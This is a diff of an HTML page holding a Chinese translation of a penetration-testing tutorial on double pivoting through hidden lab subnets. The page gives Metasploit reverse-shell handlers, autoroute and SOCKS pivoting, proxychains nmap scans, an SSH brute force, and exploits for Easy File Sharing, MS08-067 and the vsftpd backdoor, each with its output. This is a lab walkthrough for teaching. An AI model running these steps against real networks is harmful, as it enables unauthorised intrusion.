@@ -115,22 +115,24 @@
 
         <span itemprop="articleBody"><h3 id="0x00-about">0x00 About</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>内网机器如下:
-</code></pre></div></div>
+<div class="highlighter-rouge"><pre class="highlight"><code>内网机器如下:
+</code></pre>
+</div>
 <p><img src="https://pentest.blog/wp-content/uploads/final.png" /></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>说明:
+<div class="highlighter-rouge"><pre class="highlight"><code>说明:
 1)Attacker为攻击者,有一个网卡,网段为172.16.0.0,Attacker系统为kali系统
 2)RD为第一个已经渗透的目标,有两块网卡,对应172.16.0.0和7.7.7.0两个网段
 3)JC有两块网卡,对应7.7.7.0和8.8.8.0两个网段,JC有ms08-067和efs bof两个漏洞,可getshell
 4)SK有一块网卡,对应8.8.8.0网段,SK有vsftpd的漏洞,可getshell
 5)起初Attacker只拿到RD的msf的shell,对于目标内网情况一无所知,也不知道存在7.7.7.0和8.8.8.0这两个隐藏的网段
 6)目标是准备通过RD来渗透内网中7.7.7.0和8.8.8.0两个隐藏的网段
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x01-step1">0x01 Step1</h3>
 
 <p>Attacker在RD上通过webshell运行了一个reverse类型的后门,然后操作如下:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; use exploit/multi/handler 
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/multi/handler 
 msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
 payload =&gt; windows/meterpreter/reverse_tcp
 msf exploit(handler) &gt; set LHOST 172.16.0.20 
@@ -166,7 +168,8 @@ Hardware MAC : 08:00:27:7f:3c:fe
 MTU          : 1500
 IPv4 Address : 7.7.7.11
 IPv4 Netmask : 255.255.255.0
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x02-step2">0x02 Step2</h3>
 
@@ -179,7 +182,7 @@ IPv4 Netmask : 255.255.255.0
 应用程序的代理为msf的开启sock4代理模块中设置的代理入口.
 </font>
 <p>操作如下:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 7.7.7.0/24
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 7.7.7.0/24
 [*] Adding a route to 7.7.7.0/255.255.255.0...
 [+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
 [*] Use the -p option to list all active routes
@@ -190,9 +193,10 @@ Active Routing Table
  ------ ------- -------
  7.7.7.0 255.255.255.0 Session 2
 meterpreter &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>然后开始扫描7.7.7.0网段,操作如下:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
 [*] Running module against DISCORDIA
 [*] ARP Scanning 7.7.7.0/24
 [*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)
@@ -200,12 +204,13 @@ meterpreter &gt;
 [*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)
 [*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)
 meterpreter &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>arp_scanner不太够用,不能扫到端口信息[此时也可用msf自带的其他可以扫描端口的模块如auxiliary/scanner/portscan/tcp来扫
 描,因为前面添加了路由,使得msf中的模块可以用meterpreter作为代理访问到7.7.7.x网段],于是用Attacker本机的nmap来扫[可以
 更完全的扫描,nmap应该比msf中的扫描模块强大],首先在RD上开sockets4代理,然后用proxychains设置nmap的代理为msf模块开
 启的Attacker的1080端口提供的代理,操作如下:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; background 
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; background 
 [*] Backgrounding session 2...
 msf &gt; use auxiliary/server/socks4a 
 msf auxiliary(socks4a) &gt; show options 
@@ -227,17 +232,19 @@ msf auxiliary(socks4a) &gt; netstat -antp | grep 1080
 [*] exec: netstat -antp | grep 1080
 tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
 msf auxiliary(socks4a) &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>proxychains设置/etc/proxychains.conf如下:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ProxyList]
+<div class="highlighter-rouge"><pre class="highlight"><code>[ProxyList]
 # add proxy here ...
 # meanwile
 # defaults set to "tor"
 #socks4  127.0.0.1 9050
 socks4  172.16.0.20 1080
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>nmap扫描如下:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.25BETA1 ( https://nmap.org )
 |S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
@@ -278,7 +285,8 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
 root@kali:~#
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>现在发现了7.7.7.20(JC)这台机器端口开放比较多,尝试找出JC的漏洞,操作如下:
 首先看看JC的80端口运行了什么cms,但是Attacker的浏览器直接访问http://172.16.0.20会无法访问,因为Attacker的网段与JC
 不在同一网段,此处有个要注意的内容:</p>
@@ -287,7 +295,7 @@ root@kali:~#
 可以选择使用proxychains设置Attacker的浏览器的代理为Attacker的1080端口的socks4代理入口,也可通过在RD的meterpreter会
 话中运行portfwd模块命令,portfwd命令如下:
 </font>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
 [*] Local TCP relay created: 172.16.0.20:2323 &lt;-&gt; 7.7.7.20:80
 meterpreter &gt;
 
@@ -299,7 +307,8 @@ Active Port Forwards
    1      172.16.0.20:2323  7.7.7.20:80  Forward
 1 total active port forwards.
 meterpreter &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>通过访问Attacker的2323端口访问JC的80端口,结果如下:
 <img src="https://pentest.blog/wp-content/uploads/5.png" /></p>
 
@@ -319,7 +328,7 @@ meterpreter &gt;
 portfwd的用法如下:
 </font>
 </pre>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; portfwd -h
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; portfwd -h
 Usage: portfwd [-h] [add | delete | list | flush] [args]
 OPTIONS:
      -L &gt;opt&gt;  The local host to listen on (optional).
@@ -328,7 +337,8 @@ OPTIONS:
      -p &gt;opt&gt;  The remote port to connect on.
      -r &gt;opt&gt;  The remote host to connect on.
 meterpreter &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <font color="#33ccff">
 其中-L只能设置为攻击者的ip,不能设置为肉鸡的ip,-L设置的ip可以是攻击者的内网ip,-r也可以是目标的内网ip,两个内网之
 间通过meterpreter会话的"隧道"来连通,如果-L后设置的ip是攻击者的内网ip,-r后设置的是目标机器的内网ip,portfwd通过
@@ -344,7 +354,7 @@ route add只会给msf的模块提供meterpreter会话通道作为代理服务,�
 
 <p>上面访问得到目标机器JC的80端口信息看出JC运行的是Eash File Sharing Web Server,可用msf中的模块尝试getshell,操作如
 下(如果没有在meterpreter中添加路由msf是访问不到7.7.7.20的):</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf  &gt; use exploit/windows/http/easyfilesharing_seh 
+<div class="highlighter-rouge"><pre class="highlight"><code>msf  &gt; use exploit/windows/http/easyfilesharing_seh 
 msf exploit(easyfilesharing_seh) &gt; show options 
 Module options (exploit/windows/http/easyfilesharing_seh):
    Name   Current Setting  Required  Description
@@ -365,9 +375,10 @@ msf exploit(easyfilesharing_seh) &gt; run
 [+] 7.7.7.20:80 - Exploit Sent
 [*] Sending stage (957999 bytes) to 7.7.7.20
 [*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>或者从JC(7.7.7.20)22端口入手:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; use auxiliary/scanner/ssh/ssh_enumusers 
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use auxiliary/scanner/ssh/ssh_enumusers 
 msf auxiliary(ssh_enumusers) &gt; set rhosts 7.7.7.20
 rhosts =&gt; 7.7.7.20
 msf auxiliary(ssh_enumusers) &gt; set rport 22
@@ -413,9 +424,10 @@ msf auxiliary(ssh_enumusers) &gt; run
 [*] Auxiliary module execution completed
 ^C
 msf auxiliary(ssh_enumusers) &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>然后用hydra本地用msf模块开启的1080端口的sock4代理尝试爆破:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
 ProxyChains-3.1 (http://proxychains.sf.net)
 Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 Hydra (http://www.thc.org/thc-hydra) starting 
@@ -436,9 +448,10 @@ Hydra (http://www.thc.org/thc-hydra) starting
 1 of 1 target successfully completed, 1 valid password found
 Hydra (http://www.thc.org/thc-hydra) finished
 root@kali:~#
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>发现有可用帐户密码admin:123456,然后再用sock4代理ssh登录:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# proxychains ssh admin@7.7.7.20
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# proxychains ssh admin@7.7.7.20
 ProxyChains-3.1 (http://proxychains.sf.net)
 |D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
 The authenticity of host '7.7.7.20 (7.7.7.20)' can't be established.
@@ -459,9 +472,10 @@ bvshell:/C/Documents and Settings/All Users$ dir
       0 Files                  0 bytes
       7 Directories
 bvshell:/C/Documents and Settings/All Users$
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>或者用ms08067:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; use exploit/windows/smb/ms08_067_netapi 
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/windows/smb/ms08_067_netapi 
 msf exploit(ms08_067_netapi) &gt; show options 
 Module options (exploit/windows/smb/ms08_067_netapi):
    Name     Current Setting  Required  Description
@@ -504,9 +518,10 @@ msf exploit(ms08_067_netapi) &gt; run
 [*] Sending stage (957999 bytes) to 7.7.7.20
 [*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) 
 meterpreter &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>成功溢出getshell后查看JC(7.7.7.20)网卡信息:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; ipconfig
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; ipconfig
 Interface  1
 ============
 Name         : MS TCP Loopback interface
@@ -528,31 +543,34 @@ MTU          : 1500
 IPv4 Address : 7.7.7.20
 IPv4 Netmask : 255.255.255.0
 meterpreter &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>发现又出现一个8.8.8.x的网段,于是将这个网段添加路由,以便msf中的模块可以访问到8.8.8.x网段</p>
 
 <h3 id="0x03-step3">0x03 Step3</h3>
 
 <p>先直接用新的meterpreter shell看看8.8.8.x这个网段有什么机器</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24
 [*] Running module against SRV03
 [*] ARP Scanning 8.8.8.0/24
 [*]   IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)
 [*]   IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)
 [*]   IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)
 [*]    IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS)
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>为了让msf中所有模块都能访问到8.8.8.x网段,在新的meterpreter会话中添加路由:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 8.8.8.0/24
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 8.8.8.0/24
 [*] Adding a route to 8.8.8.0/255.255.255.0...
 [+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20
 [*] Use the -p option to list all active routes
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>为了让Attacker的除了msf模块以外的其他应用程序能访问到8.8.8.x网段,再使用msf的开启sock4代理的模块开启另外一个端口
 作为8.8.8.x网段的入口:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4a 
+<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4a 
 msf auxiliary(socks4a) &gt; show options 
 Module options (auxiliary/server/socks4a):
    Name     Current Setting  Required  Description
@@ -569,22 +587,24 @@ msf auxiliary(socks4a) &gt; run
 [*] Auxiliary module execution completed
 [*] Starting the socks4a proxy server
 msf auxiliary(socks4a) &gt;
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>也即现在Attacker本地的1080端口的代理可以访问到7.7.7.x网段,1081端口的代理可以访问到8.8.8.x网段,然后将新开的端口
 添加到proxychains的配置文件中:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat /etc/proxychains.conf | grep -v "#"
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# cat /etc/proxychains.conf | grep -v "#"
 dynamic_chain
 proxy_dns 
 tcp_read_time_out 15000
 tcp_connect_time_out 8000
 socks4  172.16.0.20 1080  # First Pivot
 socks4  172.16.0.20 1081  # Second Pivot
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>上面的两个代理相当于扇门的钥匙,172.16.0.20:1080是7.7.7.x的钥匙,172.16.0.20:1081是7.7.7.x后面的8.8.8.x的钥匙
 ,Attacker要想访问到8.8.8.x可以通过先打开7.7.7.x的门,再打开8.8.8.x的门(因为8.8.8.x这个门在7.7.7.x这个门之后)</p>
 
 <p>使用Attacker本地的nmap扫描下8.8.8.x网段:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.25BETA1 ( https://nmap.org )
 Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).
@@ -629,9 +649,10 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
 root@kali:~#
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>发现8.8.8.9(SK)这台机器可能有漏洞,用msf模块尝试getshell:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; 
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; 
 msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor 
 msf exploit(vsftpd_234_backdoor) &gt; show options 
 Module options (exploit/unix/ftp/vsftpd_234_backdoor):
@@ -674,7 +695,8 @@ lo        Link encap:Local Loopback
           TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:0 
           RX bytes:5307479 (5.0 MB)  TX bytes:5307479 (5.0 MB)
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>翻译自:https://pentest.blog/explore-hidden-networks-with-double-pivoting/</p>
 </span>
